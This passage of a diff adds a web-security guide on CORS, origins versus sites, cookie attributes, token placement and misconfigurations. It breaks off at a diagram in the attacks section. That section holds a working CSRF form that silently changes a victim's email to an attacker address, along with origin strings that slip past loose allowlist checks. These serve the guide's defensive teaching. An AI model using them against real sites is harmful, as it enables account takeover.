@@ -1,0 +1,709 @@
+---
+title: "CORS and Cookies in Practice: Origins, Credentials, and Common Misconfigurations"
+date: "2026-11-22"
+summary: "How browsers decide what a page may send to another origin and what it may read back, how cookies travel with those requests, and the CORS and cookie misconfigurations that lead to CSRF and data theft - with the fix for each."
+tags:
+  [
+    "CORS",
+    "Cookies",
+    "CSRF",
+    "Browser Security",
+    "Web Security",
+    "API Design",
+    "Security",
+  ]
+track: "Backend Engineering"
+level: "Intermediate"
+appliesTo:
+  [
+    "APIs called from a browser",
+    "Frontends on a different origin than the API",
+    "Cookie-based sessions",
+    "CORS configuration",
+  ]
+takeaway: "CORS decides which origins may read a response, not which may send a request. Cookies follow site rules, not origin rules. A safe browser session needs an exact origin allowlist, strict cookie attributes, and an Origin check on every route that changes state."
+---
+
+# CORS and Cookies in Practice: Origins, Credentials, and Common Misconfigurations
+
+> Parts 1 and 2 explain the browser rules. Parts 3 and 4 explain the server settings. Part 6 shows what goes wrong when those settings are wrong. Each part starts with an "In short" box, and the extra detail is in sections you can open. For how tokens themselves are issued, rotated and revoked, see [Session Security in Practice](/blog/session-security-in-practice).
+
+<GuideMap
+  items={[
+    {
+      href: "#origins-and-sites",
+      title: "Origins and sites",
+      summary: "The two ways a browser compares URLs, and which rules use which.",
+    },
+    {
+      href: "#same-origin-policy",
+      title: "The Same-Origin Policy",
+      summary: "What a page may send to another origin, and what it may read back.",
+    },
+    {
+      href: "#cors",
+      title: "CORS",
+      summary: "Simple and preflighted requests, the response headers, and credentials.",
+    },
+    {
+      href: "#cookies-across-origins",
+      title: "Cookies across origins",
+      summary: "Cookie attributes, which requests carry a cookie, and what SameSite does not cover.",
+    },
+    {
+      href: "#where-tokens-fit",
+      title: "Where tokens fit",
+      summary: "Cookie or header, and which attacks each one is open to.",
+    },
+    {
+      href: "#misconfigurations-and-attacks",
+      title: "Misconfigurations and attacks",
+      summary: "The common CORS and cookie mistakes, the attacks they allow, and the defenses.",
+    },
+    {
+      href: "#checklist",
+      title: "Checklist",
+      summary: "Every setting from this guide in one table.",
+    },
+  ]}
+/>
+
+## The Example
+
+All examples in this guide use the same setup: a shop website and an admin panel that call the same API, a staging copy of the shop, and an attacker's site.
+
+| Origin                        | What it is                                                  |
+| ----------------------------- | ----------------------------------------------------------- |
+| `https://shop.example.com`    | The shop website                                            |
+| `https://admin.example.com`   | An admin panel that calls the same API                      |
+| `https://api.example.com`     | The API; it sets the session cookie                         |
+| `https://staging.example.com` | A staging copy of the shop                                  |
+| `https://evil.test`           | An attacker's site that a logged-in shopper happens to open |
+
+<Part id="origins-and-sites" number={1} total={7} title="Origins and sites">
+
+- An **origin** is scheme + host + port. Two URLs have the same origin only if all three match.
+- A **site** is scheme + registrable domain, so every subdomain of `example.com` is the same site.
+- CORS and the Same-Origin Policy compare origins. `SameSite` cookies compare sites.
+
+</Part>
+
+An origin is the scheme, host and port of a URL. If the port is left out, it is the scheme's default: 443 for `https`, 80 for `http`. A site is the scheme plus the **registrable domain**, the part of the host a person can register, such as `example.com`.
+
+<Diagram
+  src="/diagrams/blog/cors-and-cookies-in-practice/origin-and-site.svg"
+  alt="The URL https://shop.example.com:443/cart split into parts: https is the scheme, shop.example.com is the host, 443 is the port, and example.com inside the host is the registrable domain. The origin is scheme plus host plus port; the site is scheme plus registrable domain. Below, one dashed boundary marked as the site example.com holds four boxes: shop.example.com, admin.example.com, api.example.com and staging.example.com, labelled four different origins. Outside the boundary is evil.test, another site. CORS compares origins, so it treats the four as different; SameSite compares sites, so it treats them as the same."
+  width={680}
+  height={416}
+  caption="Four origins, but one site."
+/>
+
+| Compared with `https://shop.example.com` | Same origin | Same site | Why                                               |
+| ---------------------------------------- | ----------- | --------- | ------------------------------------------------- |
+| `https://shop.example.com:443/cart`      | Yes         | Yes       | 443 is the default port; the path does not count  |
+| `http://shop.example.com`                | No          | No        | Different scheme                                  |
+| `https://shop.example.com:8443`          | No          | Yes       | Different port                                    |
+| `https://api.example.com`                | No          | Yes       | Different host, same registrable domain           |
+| `https://staging.example.com`            | No          | Yes       | Different host, same registrable domain           |
+| `https://evil.test`                      | No          | No        | Different registrable domain                      |
+| `https://example.com.evil.test`          | No          | No        | The registrable domain is `evil.test`             |
+
+<MoreDetail title="Background: the Public Suffix List">
+
+Browsers cannot tell where the registrable domain starts from the name alone. In `shop.example.com` it is `example.com`, but in `shop.example.co.uk` it is `example.co.uk`, because anyone can register a name under `co.uk`.
+
+They use the [Public Suffix List](https://publicsuffix.org/), a shared list of suffixes under which anyone can register a name. It includes country suffixes such as `co.uk`, and also hosting domains such as `github.io`, so `alice.github.io` and `bob.github.io` are **different sites**. Without that entry, every GitHub Pages site would share cookies with every other one.
+
+</MoreDetail>
+
+<MoreDetail title="Detail: the Origin header, and the null origin">
+
+The browser tells the server which origin a request came from in the `Origin` request header:
+
+```http
+Origin: https://shop.example.com
+```
+
+Browsers send it on every cross-origin request made by script, and on every request that is not a `GET` or `HEAD`, including plain form posts. Page code cannot set or change it. A command-line tool can send any value it likes, so the header proves where a request came from only when the client is a real browser.
+
+In some cases the browser sends the literal value `null` instead of an origin:
+
+- a page in a sandboxed `<iframe>` (without `allow-same-origin`)
+- a page opened from a `file://` path or a `data:` URL
+- some requests that followed a redirect to another origin
+
+Any page can create the first case, which is why Part 6 treats allowing `null` as close to allowing everyone.
+
+</MoreDetail>
+
+<Part id="same-origin-policy" number={2} total={7} title="The Same-Origin Policy">
+
+- The Same-Origin Policy stops a page's script from **reading** responses from another origin.
+- It does not stop a page from **sending** requests to another origin. The server receives them and runs the handler.
+- Only browsers apply it. Postman, curl and server-to-server calls are not affected.
+
+</Part>
+
+Say a shopper is logged in to their bank in one tab and opens an unrelated site in another. If browsers did not have the Same-Origin Policy, that site's script could call `fetch("https://bank.example/accounts")`, and the browser would attach the bank's cookie and hand the response, the account list, to the unrelated site. The policy stops this: a page can only read responses from its own origin.
+
+The browser does this on its own. The bank's server does not need to set anything.
+
+The policy only blocks reading. Most other cross-origin traffic is allowed:
+
+| What a page on one origin does to another origin                | Allowed | Notes                                                                     |
+| --------------------------------------------------------------- | ------- | ------------------------------------------------------------------------- |
+| Link to it, redirect to it, or submit a form to it              | Yes     | The request is sent with the target's cookies, if their `SameSite` allows |
+| Embed its images, scripts, styles, or frames                    | Yes     | The page can show them but cannot read the bytes                          |
+| Send a request with `fetch` or `XMLHttpRequest`                 | Yes     | The request is sent; see the next row                                     |
+| Read the response of that request                               | No      | Unless the other origin allows it with CORS                               |
+| Read the DOM, storage or cookies of a frame from that origin    | No      |                                                                           |
+
+<Diagram
+  src="/diagrams/blog/cors-and-cookies-in-practice/same-origin-policy.svg"
+  alt="Inside the shopper's browser, a page on evil.test runs a script that sends POST /account/email to api.example.com. The request leaves the browser and reaches the API, and the handler runs, so the write happens. The API answers 200 OK with data. The response comes back to the browser, but there is no CORS permission for evil.test, so the browser stops it before the page: the script cannot read the response. The write goes through; only the read is blocked."
+  width={680}
+  height={363}
+  caption="The request goes out and the handler runs. The page just cannot read the response."
+/>
+
+<Callout title="The request is still sent" tone="warning">
+
+The Same-Origin Policy protects responses, not servers. A request from another origin reaches the API and the handler runs. If that handler changes data, the change happens whether or not the page can read the reply.
+
+</Callout>
+
+Normally, the API rejects a request from someone who is not logged in. But the browser adds the shopper's cookie to the request on its own, so the API thinks the shopper sent it and does what it asks. That attack is **cross-site request forgery (CSRF)**, and Part 6 covers it.
+
+<MoreDetail title="Background: why cross-origin writes are allowed">
+
+The web had cross-site links, forms and images long before it had scripts that could read responses. A form on one site that posts to another, or a page that shows an image hosted elsewhere, is ordinary web behaviour, and blocking it would break a large part of the web.
+
+Scripts added something new: they could **read** another site's response with the user's cookies. The policy was added to stop that. Writes were left as they were, so protecting them is the server's job.
+
+</MoreDetail>
+
+<MoreDetail title="Background: why Postman and curl are not affected">
+
+The policy protects the user's browser from other pages: their cookies, and the networks their machine can reach. A request from curl has neither. It holds no shopper's cookies, so to act as a shopper it would need that shopper's credentials anyway.
+
+So the policy, and CORS with it, is not a server-side access control. A server cannot rely on it to keep a client out; it only tells browsers what pages may read.
+
+</MoreDetail>
+
+<Part id="cors" number={3} total={7} title="CORS">
+
+- CORS lets a server tell the browser which other origins may read its responses. It relaxes the Same-Origin Policy and adds no protection of its own.
+- Simple requests are sent straight away. Other requests are first checked with a **preflight** `OPTIONS` request.
+- To send cookies, the frontend must ask for them, and the server must allow them: it names the exact origin and sends `Access-Control-Allow-Credentials: true`.
+
+</Part>
+
+### Why Modern Apps Need It
+
+The shop and the API are different origins. Under the Same-Origin Policy alone, the shop's script could send requests to the API but could never read a product list or an order back. Cross-Origin Resource Sharing (CORS) is how the API says "the shop may read my responses".
+
+In the example, the API needs to decide four things:
+
+1. **Which origins** may read responses: the shop and the admin panel.
+2. **Whether credentials** are allowed: yes, because the session is a cookie.
+3. **Which methods** cross-origin calls may use: `GET`, `POST`, `PUT`, `DELETE`.
+4. **Which request headers** they may send: `Content-Type` and `Authorization`.
+
+### Simple and Preflighted Requests
+
+The browser handles a cross-origin request from script in one of two ways:
+
+| Kind        | When                                                                                                                                                                                                | What the browser does                                                                     |
+| ----------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
+| Simple      | `GET`, `HEAD` or `POST`, only basic headers, and a `Content-Type` of `text/plain`, `application/x-www-form-urlencoded` or `multipart/form-data` - the requests a plain HTML form could already send | Sends it at once, then checks the response headers before handing the response to script  |
+| Preflighted | Anything else: `PUT`, `PATCH`, `DELETE`, a JSON body, or a custom header such as `Authorization`                                                                                                    | Sends an `OPTIONS` request first, and sends the real request only if the answer allows it |
+
+<Diagram
+  src="/diagrams/blog/cors-and-cookies-in-practice/preflight.svg"
+  alt="Two lanes, the browser and api.example.com. The shop's script calls fetch with PUT /orders/42, a JSON body and credentials include. Step 1, the browser sends a preflight: OPTIONS /orders/42 with Origin https://shop.example.com, Access-Control-Request-Method PUT and Access-Control-Request-Headers content-type. Step 2, the API allows it: 204 No Content with Allow-Origin https://shop.example.com, Allow-Methods GET, POST, PUT, DELETE, Allow-Headers Content-Type and Allow-Credentials true. The browser checks that PUT and content-type are allowed. Step 3, it sends the real PUT /orders/42 with the cookie. Step 4, the API answers 200 OK with Allow-Origin and Allow-Credentials, and the browser hands the response to the script."
+  width={680}
+  height={648}
+  caption="The browser asks first. It sends the real request only if the API allows it."
+/>
+
+<Callout title="Why this matters for security" tone="warning">
+
+A simple request reaches the handler **before** any CORS check, so CORS cannot stop it. A preflighted request from a disallowed origin never reaches the handler, because the browser stops at the preflight.
+
+</Callout>
+
+### The Response Headers
+
+| Header                             | In which response  | What it tells the browser                                        |
+| ---------------------------------- | ------------------ | ---------------------------------------------------------------- |
+| `Access-Control-Allow-Origin`      | Preflight and real | Which origin may read this response                              |
+| `Access-Control-Allow-Credentials` | Preflight and real | Whether a response to a request with credentials may be read     |
+| `Access-Control-Allow-Methods`     | Preflight          | Which methods the real request may use                           |
+| `Access-Control-Allow-Headers`     | Preflight          | Which request headers the real request may send                  |
+| `Access-Control-Max-Age`           | Preflight          | How many seconds the browser may reuse this preflight answer     |
+| `Access-Control-Expose-Headers`    | Real               | Which extra response headers script may read                     |
+| `Vary: Origin`                     | Real               | Not a CORS header: tells caches the response depends on `Origin` |
+
+A preflight never carries cookies, so the API must answer it without requiring a login.
+
+<MoreDetail title="Detail: Max-Age and Expose-Headers">
+
+**`Access-Control-Max-Age`** sets how long the browser reuses a preflight answer for the same URL, method and headers. Without it, browsers reuse it for only 5 seconds, and every non-simple call costs an extra round trip. Browsers cap the value: Chrome at 2 hours, Firefox at 24 hours. A value of a few minutes to two hours is common.
+
+**`Access-Control-Expose-Headers`** widens what script can read from a response. By default, script can read only a few basic headers (`Cache-Control`, `Content-Language`, `Content-Length`, `Content-Type`, `Expires`, `Last-Modified`, `Pragma`). A header such as `X-Request-Id` or `Retry-After` must be listed here, or `response.headers.get()` returns `null` for it.
+
+On a credentialed response, `*` is not a wildcard in `Allow-Methods`, `Allow-Headers` or `Expose-Headers` either; list the values.
+
+</MoreDetail>
+
+#### Access-Control-Allow-Origin
+
+This is the main header. If its value matches the page's origin, the browser lets the page read the response; if it is missing or different, the browser blocks the read.
+
+| Value                      | Meaning                                                          | Use it for                                       |
+| -------------------------- | ---------------------------------------------------------------- | ------------------------------------------------ |
+| `https://shop.example.com` | Only this origin may read the response                           | Any API with logged-in users                     |
+| `*`                        | Any origin may read it, but only on requests without credentials | Public data, such as an open API or public fonts |
+| `null`                     | Pages whose origin is `null` may read it                         | Nothing - any page can get a `null` origin       |
+
+The header holds one origin, so the API checks the request's `Origin` against its own list and sends back the one that matches.
+
+<MoreDetail title="Detail: why a varying Allow-Origin needs Vary: Origin">
+
+Because the API sends a different `Access-Control-Allow-Origin` depending on who asks, the same URL now has different responses. A cache or CDN in front of the API does not know that unless it is told:
+
+```http
+Access-Control-Allow-Origin: https://shop.example.com
+Vary: Origin
+```
+
+`Vary: Origin` tells every cache to store a separate copy per `Origin` value. Without it, a response cached for the shop can be served to the admin panel, and the panel's call fails with a CORS error that is hard to reproduce. Worse, a response cached for one allowed origin can be served to a request from another origin. Send `Vary: Origin` on every response whose CORS headers depend on the request, including responses to origins that were not allowed.
+
+</MoreDetail>
+
+#### Access-Control-Allow-Credentials
+
+By default, a cross-origin request from script carries no cookies. To send the shopper's session cookie, the frontend must ask for it and the API must allow it:
+
+```ts
+// Frontend (with axios: { withCredentials: true })
+fetch("https://api.example.com/orders", { credentials: "include" });
+
+// API response headers
+// Access-Control-Allow-Origin: https://shop.example.com
+// Access-Control-Allow-Credentials: true
+```
+
+| Frontend sends cookies? | API answers                                | Result                                              |
+| ----------------------- | ------------------------------------------ | --------------------------------------------------- |
+| No                      | Anything                                   | No cookie is sent; the API sees an anonymous caller |
+| Yes                     | Exact origin + `Allow-Credentials: true`   | The page can read the response                      |
+| Yes                     | No `Allow-Credentials`                     | Blocked                                             |
+| Yes                     | `Allow-Origin: *`                          | Blocked                                             |
+
+The last row is why an API with a cookie session needs a real allowlist: it cannot allow every origin and use cookies at the same time.
+
+<MoreDetail title="Detail: what counts as a credential, and why a Bearer token does not">
+
+| Credential                                              | Covered by `Allow-Credentials` | How it is sent                                   |
+| ------------------------------------------------------- | ------------------------------ | ------------------------------------------------ |
+| Cookies                                                 | Yes                            | By the browser, automatically                    |
+| HTTP authentication the browser manages (Basic, Digest) | Yes                            | By the browser, after a login prompt             |
+| TLS client certificates                                 | Yes                            | By the browser, during the TLS handshake         |
+| `Authorization: Bearer ...` set by your code            | No                             | Only when your code adds it                      |
+| A token inside a JSON response body                     | No                             | It is data, not a credential the browser handles |
+
+An `Authorization` header that your code sets is an ordinary request header. It does not need `Allow-Credentials`, but it makes the request preflighted, so the API must list it:
+
+```http
+Access-Control-Allow-Headers: Authorization, Content-Type
+```
+
+Unlike a cookie, the browser never adds it by itself. A page on `evil.test` cannot make the browser send the shopper's Bearer token, because the token is held by the shop's code, not by the browser. Part 5 compares the two.
+
+</MoreDetail>
+
+### The Example, End to End
+
+The API keeps its allowlist in code and compares origins as exact strings:
+
+<CodeToggle title="CORS check on the API">
+
+```typescript
+const ALLOWED_ORIGINS = new Set([
+  "https://shop.example.com",
+  "https://admin.example.com",
+]);
+
+function applyCors(req: Request, res: Response) {
+  const origin = req.headers.get("origin");
+
+  // Responses differ by Origin, so caches must store them separately.
+  res.headers.append("Vary", "Origin");
+
+  // Exact match only: no prefix, suffix or pattern checks.
+  if (!origin || !ALLOWED_ORIGINS.has(origin)) return;
+
+  res.headers.set("Access-Control-Allow-Origin", origin);
+  res.headers.set("Access-Control-Allow-Credentials", "true");
+
+  if (req.method === "OPTIONS") {
+    res.headers.set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE");
+    res.headers.set(
+      "Access-Control-Allow-Headers",
+      "Content-Type, Authorization",
+    );
+    res.headers.set("Access-Control-Max-Age", "600");
+  }
+}
+```
+
+</CodeToggle>
+
+Here are three requests, and what the browser does with each:
+
+<CodeToggle title="1. The shop loads orders (simple GET with the cookie)" language="http">
+
+```http
+GET /orders HTTP/1.1
+Host: api.example.com
+Origin: https://shop.example.com
+Cookie: session=...
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://shop.example.com
+Access-Control-Allow-Credentials: true
+Vary: Origin
+Content-Type: application/json
+
+[{ "id": 42, "status": "paid" }]
+```
+
+The origin is on the list and credentials are allowed, so the shop's script gets the order list.
+
+</CodeToggle>
+
+<CodeToggle title="2. The shop updates an order (preflight, then PUT)" language="http">
+
+```http
+OPTIONS /orders/42 HTTP/1.1
+Origin: https://shop.example.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: content-type
+
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: https://shop.example.com
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Max-Age: 600
+Vary: Origin
+
+PUT /orders/42 HTTP/1.1
+Origin: https://shop.example.com
+Content-Type: application/json
+Cookie: session=...
+
+{ "address": "..." }
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://shop.example.com
+Access-Control-Allow-Credentials: true
+Vary: Origin
+```
+
+The preflight answer allows `PUT` with a JSON body, so the browser sends the real request. For the next 10 minutes, the same call skips the preflight.
+
+</CodeToggle>
+
+<CodeToggle title="3. evil.test tries to read the orders" language="http">
+
+```http
+GET /orders HTTP/1.1
+Host: api.example.com
+Origin: https://evil.test
+Cookie: session=...
+
+HTTP/1.1 200 OK
+Vary: Origin
+Content-Type: application/json
+
+[{ "id": 42, "status": "paid" }]
+```
+
+The request is simple, so it is sent, with the cookie if `SameSite` allows it. The API runs the handler and returns the data, but with no `Access-Control-Allow-Origin` for `evil.test`, so the browser keeps the response from the page. The read is blocked; the request still happened. Part 4 shows how `SameSite` keeps the cookie off this request in the first place.
+
+</CodeToggle>
+
+<MoreDetail title="Gotcha: your code cannot see why a CORS check failed">
+
+When the browser blocks a response, `fetch` rejects with a generic `TypeError: Failed to fetch`. The reason, such as a missing header or a mismatched origin, is shown only in the browser console, never to the code, so the page cannot tell a CORS failure from a network failure. Meanwhile the API's logs show a normal `200`. When a call works in Postman but fails in the browser, read the console and compare the response headers with this part.
+
+</MoreDetail>
+
+<Part id="cookies-across-origins" number={4} total={7} title="Cookies across origins">
+
+- A cookie belongs to the host that set it, and the browser sends it on every request to that host that the cookie's attributes allow.
+- `SameSite` decides whether a cookie goes on requests that **another site** started. It compares sites, so it does not separate subdomains of the same domain.
+- For a session cookie: `HttpOnly`, `Secure`, `SameSite=Strict` or `Lax`, and no `Domain` unless subdomains really need it.
+
+</Part>
+
+The API sets the session cookie in a response header:
+
+```http
+Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
+```
+
+From then on, the browser attaches it to requests to `api.example.com` that its attributes allow. A cross-origin call from the shop also needs `credentials: "include"` from Part 3, or the browser leaves the cookie out.
+
+### Cookie Attributes
+
+| Attribute               | What it does                                                                                                          | For a session cookie                       |
+| ----------------------- | --------------------------------------------------------------------------------------------------------------------- | ------------------------------------------ |
+| `HttpOnly`              | Script cannot read the cookie through `document.cookie`                                                               | Always                                     |
+| `Secure`                | Sent only over HTTPS                                                                                                  | Always                                     |
+| `SameSite`              | Whether the cookie goes on requests started by another site (see below)                                               | `Strict` or `Lax`                          |
+| `Domain`                | Without it, the cookie goes only to the exact host that set it. With `Domain=example.com`, it goes to every subdomain | Leave it out                               |
+| `Path`                  | Sends the cookie only on requests under that path                                                                     | `/`, or the routes that need it            |
+| `Max-Age` / `Expires`   | Without them, the cookie is deleted when the browser closes                                                           | Match the session's lifetime               |
+
+`HttpOnly` keeps a script from **reading** the cookie, which stops a cross-site scripting (XSS) bug from stealing it. It does not stop that script from **using** it: injected code on the shop can still call the API, and the browser still attaches the cookie.
+
+### SameSite
+
+`SameSite` looks at the site that started the request and the site of the target. If they differ, the request is cross-site, and the attribute decides whether the cookie goes with it:
+
+| Request to `api.example.com`                               | `Strict` | `Lax`    | `None`  |
+| ---------------------------------------------------------- | -------- | -------- | ------- |
+| `fetch` from `shop.example.com` (same site)                | Sent     | Sent     | Sent    |
+| `fetch` from `staging.example.com` (same site)             | Sent     | Sent     | Sent    |
+| Link from `evil.test`, opened in the tab (top-level `GET`) | Not sent | Sent     | Sent    |
+| Form `POST` from `evil.test`                               | Not sent | Not sent | Sent    |
+| `fetch`, `<img>` or `<iframe>` from `evil.test`            | Not sent | Not sent | Sent    |
+
+`SameSite=None` must be combined with `Secure`, or the browser rejects the cookie.
+
+<Diagram
+  src="/diagrams/blog/cors-and-cookies-in-practice/samesite-gap.svg"
+  alt="Inside one dashed boundary for the site example.com are shop.example.com, staging.example.com and api.example.com, whose session cookie has SameSite=Strict. Requests from the shop and from staging to the API both carry the cookie. Outside the boundary, evil.test sends two kinds of request to the API: a link opened in the tab, which carries the cookie with Lax but not with Strict, and a form POST, fetch or image, which never carries it. SameSite stops other sites; it does not stop other subdomains of the same site."
+  width={680}
+  height={410}
+  caption="The first two rows of the table: every subdomain of the site gets the cookie, even with Strict."
+/>
+
+Keeping staging and other subdomains away from the API takes the CORS allowlist and an `Origin` check on the server, covered in Part 6.
+
+<MoreDetail title="Edge case: when SameSite is missing">
+
+Chrome and other Chromium browsers treat a cookie without `SameSite` as `Lax`. For two minutes after such a cookie is set, Chrome still sends it on cross-site top-level `POST` requests, so that some older login flows keep working. Firefox and Safari do not apply `Lax` by default.
+
+Because the default depends on the browser, set `SameSite` on every cookie explicitly.
+
+</MoreDetail>
+
+<MoreDetail title="Detail: cookie prefixes, __Host- and __Secure-">
+
+A cookie's name can carry a prefix the browser enforces:
+
+| Prefix      | The browser accepts the cookie only if                                     |
+| ----------- | -------------------------------------------------------------------------- |
+| `__Secure-` | It has `Secure` and was set over HTTPS                                     |
+| `__Host-`   | It has `Secure`, was set over HTTPS, has **no** `Domain`, and has `Path=/` |
+
+`__Host-` is the stronger one. A cookie with that name can only have been set by the exact host itself, never by a sibling subdomain with `Domain=example.com`. Part 6 explains why that matters.
+
+`__Host-` requires `Path=/`, so a cookie limited to the auth routes, such as a refresh token with `Path=/auth`, cannot use it. `__Secure-` still applies to that cookie.
+
+</MoreDetail>
+
+<MoreDetail title="Detail: third-party cookie blocking">
+
+If the API were on a different site from the shop, for example `api.example-cloud.net`, its cookie would be a **third-party cookie** when the shop calls it: the page belongs to one site, the cookie to another. Safari blocks third-party cookies by default, Firefox keeps them in a separate store per top-level site, and Chrome lets users block them.
+
+The cookie would then be missing in some browsers even with a perfect CORS setup, and it would need `SameSite=None`. Putting the API on a subdomain of the frontend's domain makes the cookie first-party and avoids both problems.
+
+</MoreDetail>
+
+<MoreDetail title="Gotcha: Path is not a security boundary">
+
+`Path` controls which requests carry a cookie. It does not hide the cookie from other pages on the same origin: a page at `/blog` can open `/account` in a hidden frame and read the cookie through it, if the cookie is not `HttpOnly`. Use `Path` to keep a cookie off requests that do not need it, not to protect it from the rest of the origin.
+
+</MoreDetail>
+
+<Part id="where-tokens-fit" number={5} total={7} title="Where tokens fit">
+
+- A cookie is sent automatically, so it needs CSRF defenses. A header token is sent only by your code, so it has no CSRF risk but has to be kept away from XSS.
+- A common setup: a short-lived access token in memory, sent as a header, and a refresh token in an `HttpOnly` cookie limited to the auth routes.
+
+</Part>
+
+Where a browser app keeps a token decides which attacks it is open to:
+
+| Where the token is kept                              | Sent automatically | Readable by XSS          | CSRF risk | CORS needs                         |
+| ---------------------------------------------------- | ------------------ | ------------------------ | --------- | ---------------------------------- |
+| Memory, sent as a header                             | No                 | Harder; it is not stored | No        | `Authorization` in `Allow-Headers` |
+| `localStorage` or `sessionStorage`, sent as a header | No                 | Yes                      | No        | `Authorization` in `Allow-Headers` |
+| `HttpOnly` cookie                                    | Yes                | No                       | Yes       | Exact origin and credentials       |
+| Cookie without `HttpOnly`                            | Yes                | Yes                      | Yes       | Exact origin and credentials       |
+
+Every option has a risk. A cookie the browser sends needs the defenses in Part 6. A token your code sends needs a page with no injected script.
+
+### The Calls in a Token-Based Session
+
+A common setup uses both. The access token stays in memory, and your code sends it as a header. The refresh token is in an `HttpOnly` cookie that only goes to the auth routes (`Path=/auth`). This is what each call sends:
+
+| Call     | Your code sends                                   | The browser adds | The API sends back                                              |
+| -------- | ------------------------------------------------- | ---------------- | --------------------------------------------------------------- |
+| Login    | Email and password, with `credentials: "include"` | Nothing          | Access token in the body; refresh token in `Set-Cookie`         |
+| API call | `Authorization: Bearer ...`                       | Nothing          | The data                                                        |
+| Refresh  | An empty `POST`, with `credentials: "include"`    | Refresh cookie   | New access token in the body; new refresh token in `Set-Cookie` |
+| Logout   | A `POST`, with `credentials: "include"`           | Refresh cookie   | A `Set-Cookie` that clears the cookie                           |
+
+<Diagram
+  src="/diagrams/blog/cors-and-cookies-in-practice/token-calls.svg"
+  alt="Three lanes: your code, the browser, and api.example.com, with four calls in order. 1, Login: your code sends the email and password, the browser adds nothing, and the request goes to POST /auth/login. The API answers 200 with a Set-Cookie; the browser stores the cookie and your code gets the access token. 2, API call: your code adds the Bearer token, the browser adds nothing, and the request goes to GET /orders. The API answers 200 with the data. 3, Refresh, when the access token has expired: the browser adds the cookie to POST /auth/refresh. The API answers 200 with a Set-Cookie; the browser stores the new cookie and your code gets a new access token. 4, Logout: the browser adds the cookie to POST /auth/logout. The API answers 200 with a Set-Cookie, the browser deletes the cookie, and the user is logged out. Your code adds the access token; only the browser can add the refresh cookie."
+  width={680}
+  height={853}
+  caption="The same four calls in order: the access token comes from your code, the refresh cookie from the browser."
+/>
+
+Only login, refresh and logout use the cookie, so only those three need the exact origin and `Allow-Credentials: true`. The API call needs the exact origin and `Authorization` in `Allow-Headers`. Without `credentials: "include"` on the login call, the browser ignores the `Set-Cookie` and the refresh token is never stored.
+
+[Session Security in Practice](/blog/session-security-in-practice) covers how the two tokens are issued, rotated and revoked.
+
+<Part id="misconfigurations-and-attacks" number={6} total={7} title="Misconfigurations and attacks">
+
+- Most CORS bugs come from building `Access-Control-Allow-Origin` from the request instead of from an exact list.
+- CSRF works because browsers attach cookies to requests that other sites start. `SameSite`, an `Origin` check and CSRF tokens close it.
+- Anything on the same site, such as a staging app or a forgotten subdomain, gets past `SameSite`.
+
+</Part>
+
+### Common Misconfigurations
+
+| Configuration                                                               | What goes wrong                                                                                                                                                       | Fix                                                     |
+| --------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------- |
+| Reflecting any `Origin` back, with credentials on                           | Every site can read logged-in users' responses                                                                                                                        | Exact-match allowlist                                   |
+| Checking origins with `startsWith`, `endsWith`, `includes` or a loose regex | `https://example.com.evil.test` passes a prefix check; `https://evil-example.com` passes `endsWith("example.com")`; an unescaped `.` in a regex matches any character | Compare whole strings against a fixed list              |
+| Allowing `null`                                                             | Any page can send `Origin: null` from a sandboxed iframe                                                                                                              | Never list `null`                                       |
+| Trusting every subdomain (`*.example.com`)                                  | One XSS bug or one taken-over subdomain can read the API as any user                                                                                                  | List the subdomains that need access                    |
+| Allowing `http://` origins                                                  | A network attacker can serve script on the plain-HTTP origin                                                                                                          | HTTPS origins only                                      |
+| Staging, preview or `localhost` origins in the production list              | A less protected environment can read production data                                                                                                                 | One list per environment, checked at release            |
+| No `Vary: Origin` on a response whose `Allow-Origin` varies                 | Caches serve one origin's response to another                                                                                                                         | Always send `Vary: Origin`                              |
+| `Access-Control-Allow-Origin: *` on an internal API with no login           | Any page an employee opens can read it, because their browser is inside the network                                                                                   | Require authentication, or allow only internal origins  |
+| `SameSite=None` with no other CSRF defense                                  | Every site can send requests that carry the cookie                                                                                                                    | Use `Strict` or `Lax`, or add CSRF tokens               |
+| Treating CORS as protection for routes that change data                     | Simple requests reach the handler before any CORS check                                                                                                               | Check `Origin` on the server, or require a preflight    |
+
+### Attacks
+
+<Diagram
+  src="/diagrams/blog/cors-and-cookies-in-practice/csrf.svg"
+  alt="A logged-in shopper opens a page on evil.test. The page holds a hidden form that sends POST /account/email with email=attacker@evil.test, submitted by script. The browser adds the session cookie, and api.example.com sees a valid session and changes the email. Under each step is a point where it could have been stopped: a CSRF token, which the forged form cannot know; SameSite=Lax or Strict, so the browser leaves the cookie off; and an Origin check, so the API rejects Origin https://evil.test. The attacker never reads the response, and does not need to."
+  width={680}
+  height={416}
+  caption="CSRF: the browser sends the cookie, so the API sees the shopper. Each marked point could stop it."
+/>
+
+<MoreDetail title="Attack: cross-site request forgery (CSRF)">
+
+**How it works.** A logged-in shopper opens a page on `evil.test`. The page submits a form, or calls `fetch` without reading the reply, to a route on the API that changes something. The browser attaches the session cookie, so the API sees a valid session and does what was asked. The attacker never needs to read the response.
+
+**Example.**
+
+```html
+<form action="https://api.example.com/account/email" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.test" />
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+```
+
+This is a simple request, so no preflight stops it. A JSON API is not safe by default either: a `fetch` with `Content-Type: text/plain` and a JSON body is still a simple request, and some servers parse any body as JSON whatever its `Content-Type`.
+
+**Defense.** `SameSite=Strict` or `Lax` keeps the cookie off the request. An `Origin` check rejects it. A CSRF token, which the attacker's page cannot know, makes the forged form fail. The API should also reject a body whose `Content-Type` is not the one it expects.
+
+</MoreDetail>
+
+<Diagram
+  src="/diagrams/blog/cors-and-cookies-in-practice/reflected-origin.svg"
